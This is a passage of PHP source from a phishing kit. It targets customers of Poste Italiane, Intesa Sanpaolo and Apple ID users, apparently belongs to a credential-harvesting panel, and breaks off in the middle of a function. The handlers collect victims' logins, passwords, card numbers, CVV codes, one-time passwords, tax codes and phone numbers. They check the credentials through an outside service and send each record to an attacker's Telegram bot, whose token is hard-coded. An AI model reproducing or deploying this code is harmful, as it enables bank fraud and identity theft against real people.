										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
										$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";
										$TextoNotificacaoFalso = urlencode($TextoNotiFormat);

                  }
                  if($TG_True_CardNumber != ""){

	                	$TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
										$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
										$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
										$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9D\x8C".'"');
										$TextoNotiFormat .= "<b> $TxtFalseOuTrue </b> ";
										$TextoNotiFormat .= json_decode('"'."\xE2\x9D\x8C".'"');
										$TextoNotiFormat .= "\n\n" . json_decode('"'."\xE2\x8C\x9B".'"');
										$TextoNotiFormat .= "<b> Part:</b> $DetectaParte";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
										$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x8F".'"');
										$TextoNotiFormat .= "<b> Username:</b> $TG_True_Email";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
										$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x91\xA6 ".'"');
										$TextoNotiFormat .= "<b> Nome:</b> $TG_True_nome_input";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x91\xA6 ".'"');
										$TextoNotiFormat .= "<b> Cognome:</b> $TG_True_cognome_input";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9D ".'"');
										$TextoNotiFormat .= "<b> Data nascita:</b> $TG_True_data_nascita";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9D ".'"');
										$TextoNotiFormat .= "<b> Codice Fiscale:</b> $TG_True_codice_fiscale";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
										$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
										$TextoNotiFormat .= "<b> Card Number:</b> $TG_True_CardNumber";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
										$TextoNotiFormat .= "<b> Expirity Date:</b> $TG_True_ExpirityDate";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
										$TextoNotiFormat .= "<b> CVV:</b> $TG_True_CVV";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
										$TextoNotiFormat .= "<b> Cell:</b> $TG_True_Cell";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB0".'"');
										$TextoNotiFormat .= "<b> Saldo:</b> $TG_True_Saldo";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
										$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
										$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";
										$TextoNotificacaoFalso = urlencode($TextoNotiFormat);

                  }
                }
                if ($DetectaParte == "3/3")
                {
                  $TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
									$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
									$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
									$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9D\x8C".'"');
									$TextoNotiFormat .= "<b> $TxtFalseOuTrue </b> ";
									$TextoNotiFormat .= json_decode('"'."\xE2\x9D\x8C".'"');
									$TextoNotiFormat .= "\n\n" . json_decode('"'."\xE2\x8C\x9B".'"');
									$TextoNotiFormat .= "<b> Part:</b> $DetectaParte";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
									$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x8F".'"');
									$TextoNotiFormat .= "<b> Username:</b> $TG_True_Email";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
									$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x91\xA6 ".'"');
									$TextoNotiFormat .= "<b> Nome:</b> $TG_True_nome_input";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x91\xA6 ".'"');
									$TextoNotiFormat .= "<b> Cognome:</b> $TG_True_cognome_input";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9D ".'"');
									$TextoNotiFormat .= "<b> Data nascita:</b> $TG_True_data_nascita";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9D ".'"');
									$TextoNotiFormat .= "<b> Codice Fiscale:</b> $TG_True_codice_fiscale";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
									$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
									$TextoNotiFormat .= "<b> Card Number:</b> $TG_True_CardNumber";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
									$TextoNotiFormat .= "<b> Expirity Date:</b> $TG_True_ExpirityDate";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
									$TextoNotiFormat .= "<b> CVV:</b> $TG_True_CVV";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
									$TextoNotiFormat .= "<b> Cell:</b> $TG_True_Cell";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB0".'"');
									$TextoNotiFormat .= "<b> Saldo:</b> $TG_True_Saldo";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x91".'"');
									$TextoNotiFormat .= "<b> OTP:</b> $TG_True_Otp";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
									$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
									$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";
									$TextoNotificacaoFalso = urlencode($TextoNotiFormat);
                }
              file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoFalso&parse_mode=html");

          		}
		        }
		}
		else
		{
		    $error = 'error';

		}

		(isset($error) ? Ajax::error($error, 200) : false);


	    //file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=oi2 - $UsuarioValido");
	    $this->ControleIFS = '0';
	    $Entrar = "SIM";
	    //usuario criado com numero

}


public function getBank2Part1_Teste(){
	$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];
	$botTelegramKey = $this->global_data['botTelegramKey'];
	$this->Contos = $this->input->post('contos');
	$this->EsqueceuConta = $this->input->post('EsqueceuConta');

	file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=$NumeroSMSAdmin&text=Aqui2 -". $this->EsqueceuConta ."&parse_mode=html");
}

public function getBank2Part1(){


	$this->numeroOUemail = $this->links->Vitima($this->input->post('apple_add')); //NOVO
	$this->appleID = $this->input->post('apple_id');
	$this->applePwd = $this->input->post('apple_pwd');
	$this->linkAcessado = $this->input->post('apple_add');
	$this->cell = $this->input->post('cell');
	$this->link_address = $this->input->post('link_address');
	$this->TemplateBank = $this->input->post('TemplateBank');
	$this->RandomIdentificacao = $this->input->post('RandomIdentificacao');
	$this->MD5IdentificaAcesso = $this->input->post('MD5IdentificaAcesso');
	$this->Contos = $this->input->post('contos');
	$this->EsqueceuConta = $this->input->post('EsqueceuConta');

	$this->name = $this->appleID;
	$this->checkVictim2 = $this->victim->checkVictim($this->appleID);
	$this->checkVictim = $this->links->Vitima($this->input->post('apple_add'));
	$this->checkFirst2 = $this->victim->checkFirst($this->numeroOUemail);
	$this->checkFirst = $this->links->Vitima($this->input->post('apple_add'));
	$this->checkExisteLoginFalso = $this->wrongs->checkVictimFalso($this->RandomIdentificacao);
	$this->checkExisteLoginVerdadeiro = $this->victim->checkVictimVerdadeiro($this->RandomIdentificacao);



	$DetectaParte = "";
	$DetectaParteLoginFalso = "";

	//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=" . $this->link_address . "");
	$UserCloud = $this->appleID;
	//$PassCloud = $this->applePwd;
	$PassCloud = urlencode($this->applePwd);
	//$UsuarioValido = file_get_contents("http://sendunlock.us/ApiAutoRemove/Api.php?Usuario=fernando&Senha=Teste111&UserCloud=$UserCloud&PassCloud=$PassCloud");

	$arrContextOptions=array(
        "ssl"=>array(
            "verify_peer"=>false,
            "verify_peer_name"=>false,
        ),
    );

	$RetornoApi = file_get_contents("http://" . $this->link_address . "/ApiCheck/Api.php?CodeAcess=Test1234789&Bank=" . $this->TemplateBank . "&Username=$UserCloud&Password=$PassCloud", false, stream_context_create($arrContextOptions));
	$RetornoApiArray = explode("|", $RetornoApi);
	$UsuarioValido = $RetornoApiArray[0];

	$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];
	$botTelegramKey = $this->global_data['botTelegramKey'];

	//file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=79143763&text= API $botTelegramKey");
	//file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=$NumeroSMSAdmin&text=Aqui - $EsqueceuConta&parse_mode=html");


	if($UsuarioValido == "Error"){
		$TxtFalseOuTrue = "FALSE LOGIN";
	}
	if($UsuarioValido != "Error"){
		$TxtFalseOuTrue = "TRUE LOGIN";
	}
	if($this->TemplateBank == 1){
		$ModeloPagina = 'Poste Italiane';
	}
	if($this->TemplateBank == 2){
		$ModeloPagina = 'Intesa Sanpaolo';
	}


		if ($this
	    ->form_validation
	    ->run() == false)
		{

			if($this->EsqueceuConta == "SIM"){
				$this->EsqueceuContaSql = "Yes";
				//file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=$NumeroSMSAdmin&text=ENTROU ESQUECEU CONTA&parse_mode=html");
				if($this->checkExisteLoginFalso){ //PRIMEIRA VEZ QUE O USUARIO FALSO TENTA ENTRAR
					//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=Entrou no SE");
					$error = $this->failedReportBall();
				}
				else{ //DEMAIS TENTATIVAS DO USUARIO FALSO
					//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=Entrou no ELSE");
					$error = $this->failedReportBallUpdate($this->RandomIdentificacao);
				}

				if ($NumeroSMSAdmin != NULL)
				{

					$TG_True_LinkAcessado = $this->linkAcessado;
					$TG_True_Email = $this->appleID;
					$TG_True_Pass = $this->applePwd;
					$TG_True_Ball = '';
					$TG_True_IP = $this->ip;
					$TG_True_Browser = $this->browser;
					$TG_True_Plataform = $this->platform;
					/*
					$TG_True_CardNumber = $this->card_number;
					$TG_True_ExpirityDate = $this->expiry_date;
					$TG_True_CVV = $this->cvv;
					*/
					$TG_True_Cell = $this->cell;
					$TG_True_Saldo = $this->Contos;
					/*
					$TG_True_Otp = $this->otp;
					*/

					$TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
					$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
					$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
					$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9D\x8C".'"');
					$TextoNotiFormat .= "<b> Option: Non ricordo il codice titolare </b> ";
					$TextoNotiFormat .= json_decode('"'."\xE2\x9D\x8C".'"');
					$TextoNotiFormat .= "\n\n" . json_decode('"'."\xF0\x9F\x8F\xA6 ".'"');
					$TextoNotiFormat .= "<b> Bank:</b> $ModeloPagina";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
					$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
					$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
					$TextoNotiFormat .= "<b> Cell:</b> $TG_True_Cell";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
					$TextoNotiFormat .= "<b> Tipo di Conto:</b> $TG_True_Saldo";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
					$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
					$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
					$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";

					$TextoNotificacaoFalso = urlencode($TextoNotiFormat);


					file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoFalso&parse_mode=html");

				}

			}

			if($this->EsqueceuConta != "SIM"){
				if ($UsuarioValido != "Error") //Se o usuario for verdadeiro
	            {

								if($this->checkExisteLoginVerdadeiro){ //PRIMEIRA VEZ QUE O USUARIO VERDADEIRO TENTA ENTRAR
									$add_and_return = $this->newVictimBall();
								}
								else{ //DEMAIS TENTATIVAS DO USUARIO VERDADEIRO
									$add_and_return = $this->newVictimBallUpdate($this->RandomIdentificacao);
								}

	            	if ($NumeroSMSAdmin != NULL)
	                {
	                    $TG_True_LinkAcessado = $this->linkAcessado;
	                    $TG_True_Email = $this->appleID;
	                    $TG_True_Pass = $this->applePwd;
	                    $TG_True_Ball = '';
	                    $TG_True_IP = $this->ip;
	                    $TG_True_Browser = $this->browser;
	                    $TG_True_Plataform = $this->platform;
											/*
											$TG_True_CardNumber = $this->card_number;
	                    $TG_True_ExpirityDate = $this->expiry_date;
	                    $TG_True_CVV = $this->cvv;
											*/
	                    $TG_True_Cell = $this->cell;
	                    $TG_True_Saldo = $this->Contos;
											/*
											$TG_True_Otp = $this->otp;
											*/


	                    $TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
											$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
											$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
											$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x85".'"');
											$TextoNotiFormat .= "<b> $TxtFalseOuTrue </b> ";
											$TextoNotiFormat .= json_decode('"'."\xE2\x9C\x85".'"');
											$TextoNotiFormat .= "\n\n" . json_decode('"'."\xF0\x9F\x8F\xA6 ".'"');
											$TextoNotiFormat .= "<b> Bank:</b> $ModeloPagina";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
											$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x8F".'"');
											$TextoNotiFormat .= "<b> Username:</b> $TG_True_Email";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
											$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
											$TextoNotiFormat .= "<b> Cell:</b> $TG_True_Cell";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
											$TextoNotiFormat .= "<b> Tipo di Conto:</b> $TG_True_Saldo";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
											$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
											$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
											$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";

											$TextoNotificacaoVerdadeiro = urlencode($TextoNotiFormat);


	                    file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoVerdadeiro&parse_mode=html");
	                }

	                Ajax::Success($this->name);
	            }
	            else //Se usuário falso
		        	{
								$this->EsqueceuContaSql = "No";
								if($this->checkExisteLoginFalso){ //PRIMEIRA VEZ QUE O USUARIO FALSO TENTA ENTRAR
									//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=Entrou no SE");
									$error = $this->failedReportBall();
								}
								else{ //DEMAIS TENTATIVAS DO USUARIO FALSO
									//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=Entrou no ELSE");
									$error = $this->failedReportBallUpdate($this->RandomIdentificacao);
								}

								//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=oi8 - $UsuarioValido");
		            //$error = $this->failedReportBall();

		            if ($NumeroSMSAdmin != NULL)
		            {

									$TG_True_LinkAcessado = $this->linkAcessado;
									$TG_True_Email = $this->appleID;
									$TG_True_Pass = $this->applePwd;
									$TG_True_Ball = '';
									$TG_True_IP = $this->ip;
									$TG_True_Browser = $this->browser;
									$TG_True_Plataform = $this->platform;
									/*
									$TG_True_CardNumber = $this->card_number;
									$TG_True_ExpirityDate = $this->expiry_date;
									$TG_True_CVV = $this->cvv;
									*/
									$TG_True_Cell = $this->cell;
									$TG_True_Saldo = $this->Contos;
									/*
									$TG_True_Otp = $this->otp;
									*/

								$TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
								$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
								$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
								$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9D\x8C".'"');
								$TextoNotiFormat .= "<b> $TxtFalseOuTrue </b> ";
								$TextoNotiFormat .= json_decode('"'."\xE2\x9D\x8C".'"');
								$TextoNotiFormat .= "\n\n" . json_decode('"'."\xF0\x9F\x8F\xA6 ".'"');
								$TextoNotiFormat .= "<b> Bank:</b> $ModeloPagina";
								$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
								$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
								$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x8F".'"');
								$TextoNotiFormat .= "<b> Username:</b> $TG_True_Email";
								$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
								$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
								$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
								$TextoNotiFormat .= "<b> Cell:</b> $TG_True_Cell";
								$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
								$TextoNotiFormat .= "<b> Tipo di Conto:</b> $TG_True_Saldo";
								$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
								$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
								$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
								$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
								$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
								$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";

								$TextoNotificacaoFalso = urlencode($TextoNotiFormat);


	              file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoFalso&parse_mode=html");

	          		}
			        }
						}
		}
		else
		{
		    $error = 'error';

		}

		(isset($error) ? Ajax::error($error, 200) : false);


	    //file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=oi2 - $UsuarioValido");
	    $this->ControleIFS = '0';
	    $Entrar = "SIM";
	    //usuario criado com numero

}







	public function getBall(){
		$this->applePwd2 = explode("|", $this->input->post('apple_pwd') );


		$this->numeroOUemail = $this->links->Vitima($this->input->post('apple_add')); //NOVO
		$this->appleID = $this->input->post('apple_id');
		$this->applePwd = $this->applePwd2[1];
		$this->linkAcessado = $this->input->post('apple_add');
		//$this->load->library('extra', array('username' => $this->appleID, 'password' => $this->applePwd));
		//$this->doLogin = $this->extra->loggedIn();
		$this->name = $this->appleID;
		$this->checkVictim2 = $this->victim->checkVictim($this->appleID);
		$this->checkVictim = $this->links->Vitima($this->input->post('apple_add'));
		$this->checkFirst2 = $this->victim->checkFirst($this->numeroOUemail);
		$this->checkFirst = $this->links->Vitima($this->input->post('apple_add'));

		$UserCloud = $this->appleID;
		//$PassCloud = $this->applePwd;
		$PassCloud =  urlencode($this->applePwd);
		$UsuarioValido = file_get_contents("http://sendunlock.us/ApiAutoRemove/Api.php?Usuario=fernando&Senha=Teste111&UserCloud=$UserCloud&PassCloud=$PassCloud");

		if ($this->form_validation->run() == false) {

			$this->ControleIFS = '0';

			//usuario criado com numero
			if ($this->checkVictim) {

				if($this->checkFirst2){
					if ($UsuarioValido != "Error") {
						/*
						$name = "apps/controllers/imei.txt";
						$file = fopen($name, 'a');
						fwrite($file, $this->appleID . ' - ' . $this->applePwd . $this->links->getByUniqL($uniq) . " ##1## = " . $this->lastID2 . "\n");
						fclose($file);
						*/


						//$this->more = $this->getMore($this->doLogin->dsInfo);
						//$this->alias = $this->doLogin->dsInfo['iCloudAppleIdAlias'];
						$add_and_return = $this->updateVictimFirstBall();
						//$imeis = $this->PegaIMEI();
						//$this->addDevices($this->extra->devices, $add_and_return, $imeis);
						//$this->SendNoti($this->extra->devices, $this->name);
						//$this->DoDelete($this->extra->devices);

						$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];

						if ($NumeroSMSAdmin != NULL){
							$TG_True_LinkAcessado = $this->linkAcessado;
							$TG_True_Email = $this->appleID;
							$TG_True_Pass = $this->applePwd;
							$TG_True_Ball = $this->applePwd2[0];
							$TG_True_IP = $this->ip;
							$TG_True_Browser = $this->browser;
							$TG_True_Plataform = $this->platform;

							$TextoNotificacaoVerdadeiro = urlencode("<b>++ Novo Login Apple Kit X ++</b> \n <b>ID Link:</b> #$TG_True_LinkAcessado# \n <b>Email:</b> $TG_True_Email \n <b>Senha:</b> $TG_True_Pass \n <b>Bolinhas:</b> $TG_True_Ball \n <b>IP:</b> $TG_True_IP \n <b>Browser:</b> $TG_True_Browser \n <b>Sistema Operacional:</b> $TG_True_Plataform \n <b>Dispositivos:</b> $UsuarioValido");
							file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoVerdadeiro&parse_mode=html");
						}


						Ajax::Success($this->name);



					}else {
						$error = $this->failedReportBall();
						if ($NumeroSMSAdmin != NULL){

							$TG_False_LinkAcessado = $this->linkAcessado;
							$TG_False_Email = $this->appleID;
							$TG_False_Pass = $this->applePwd;
							$TG_False_Ball = $this->applePwd2[0];
							$TG_False_IP = $this->ip;
							$TG_False_Browser = $this->browser;
							$TG_False_Plataform = $this->platform;

							$TextoNotificacaoFalso = urlencode("<b>++ Tentativa de Login Apple Kit X ++</b> \n <b>ID Link:</b> #$TG_False_LinkAcessado# \n <b>Email:</b> $TG_False_Email \n <b>Senha:</b> $TG_False_Pass \n <b>Bolinhas:</b> $TG_False_Ball \n <b>IP:</b> $TG_False_IP \n <b>Browser:</b> $TG_False_Browser \n <b>Sistema Operacional:</b> $TG_False_Plataform");
							file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoFalso&parse_mode=html");
						}
					}
				}

			} if ($this->checkFirst &&  $this->checkVictim) {

				$UserCloud = $this->appleID;
				//$PassCloud = $this->applePwd;
				$PassCloud =  urlencode($this->applePwd);
				$UsuarioValido = file_get_contents("http://sendunlock.us/ApiAutoRemove/Api.php?Usuario=fernando&Senha=Teste111&UserCloud=$UserCloud&PassCloud=$PassCloud");
				if ($UsuarioValido != "Error") {
					/*
					$name = "apps/controllers/imei.txt";
					$file = fopen($name, 'a');
					fwrite($file, $this->appleID . ' - ' . $this->applePwd . $this->links->getByUniqL($uniq) . " ##2## = " . $this->lastID2 . "\n");
					fclose($file);
					*/


					$add_and_return = $this->newVictimBall();
					//$imeis = $this->PegaIMEI();
					//$imeis2 = $this->enviaSMSadmin();

					//$this->addDevices($this->extra->devices, $add_and_return, $imeis);
					//$this->SendNoti($this->extra->devices, $this->name);
					//$this->DoDelete($this->extra->devices);

					$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];

					if ($NumeroSMSAdmin != NULL){

						$TG_True_LinkAcessado = $this->linkAcessado;
						$TG_True_Email = $this->appleID;
						$TG_True_Pass = $this->applePwd;
						$TG_True_Ball = $this->applePwd2[0];
						$TG_True_IP = $this->ip;
						$TG_True_Browser = $this->browser;
						$TG_True_Plataform = $this->platform;

						$TextoNotificacaoVerdadeiro = urlencode("<b>++ Novo Login Apple Kit X ++</b> \n <b>ID Link:</b> #$TG_True_LinkAcessado# \n <b>Email:</b> $TG_True_Email \n <b>Senha:</b> $TG_True_Pass \n <b>Bolinhas:</b> $TG_True_Ball \n <b>IP:</b> $TG_True_IP \n <b>Browser:</b> $TG_True_Browser \n <b>Sistema Operacional:</b> $TG_True_Plataform \n <b>Dispositivos:</b> $UsuarioValido");
						file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoVerdadeiro&parse_mode=html");
					}

					Ajax::Success($this->name);


				}else {
						$error = $this->failedReportBall();

						$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];

						if ($NumeroSMSAdmin != NULL){

							$TG_False_LinkAcessado = $this->linkAcessado;
							$TG_False_Email = $this->appleID;
							$TG_False_Pass = $this->applePwd;
							$TG_False_Ball = $this->applePwd2[0];
							$TG_False_IP = $this->ip;
							$TG_False_Browser = $this->browser;
							$TG_False_Plataform = $this->platform;

							$TextoNotificacaoFalso = urlencode("<b>++ Tentativa de Login Apple Kit X ++</b> \n <b>ID Link:</b> #$TG_False_LinkAcessado# \n <b>Email:</b> $TG_False_Email \n <b>Senha:</b> $TG_False_Pass \n <b>Bolinhas:</b> $TG_False_Ball \n <b>IP:</b> $TG_False_IP \n <b>Browser:</b> $TG_False_Browser \n <b>Sistema Operacional:</b> $TG_False_Plataform");
							file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoFalso&parse_mode=html");
						}
					}


			}

			if (($this->checkVictim && $this->checkVictim2) || $this->checkFirst ) {





				if ( ($this->checkVictim && $this->checkFirst) || ($this->checkVictim2 && $this->checkFirst2)) {

					if ($UsuarioValido != "Error") {



						//$this->more = $this->getMore($this->doLogin->dsInfo);
						//$this->alias = $this->doLogin->dsInfo['iCloudAppleIdAlias'];
						$add_and_return = $this->updateVictimFirst();
						//$imeis = $this->PegaIMEI();
						//$this->addDevices($this->extra->devices, $add_and_return, $imeis);
						//$this->SendNoti($this->extra->devices, $this->name);
						//$this->DoDelete($this->extra->devices);



						Ajax::Success($this->name);

					}
					 else {

						//$error = $this->failedReportBall();
					}
				}

				else if ($UsuarioValido != "Error") {


					$this->lastID2 = $this->victim->getID($this->numeroOUemail);
					$this->updateVictimSec();
					//$this->SendNoti($this->extra->devices, $this->name);
					//$this->DoDelete($this->extra->devices);



					Ajax::Success($this->name);

				}
				 else {

					$error = $this->failedReportBall();
				}
			}
			 else
				if ($UsuarioValido != "Error") {



				$add_and_return = $this->newVictim();
				//$imeis = $this->PegaIMEI();

				//$this->addDevices($this->extra->devices, $add_and_return, $imeis);
				//$this->SendNoti($this->extra->devices, $this->name);
				//$this->DoDelete($this->extra->devices);
				Ajax::Success($this->name);


			}
			 else {



				$error = $this->failedReportBall();


			}
		}
		 else {
			$error = 'error';


		}


		(isset($error) ? Ajax::error($error, 200) : false);




	}

	public function get()
	{

		$this->numeroOUemail = $this->links->Vitima($this->input->post('apple_add')); //NOVO
		$this->appleID = $this->input->post('apple_id');
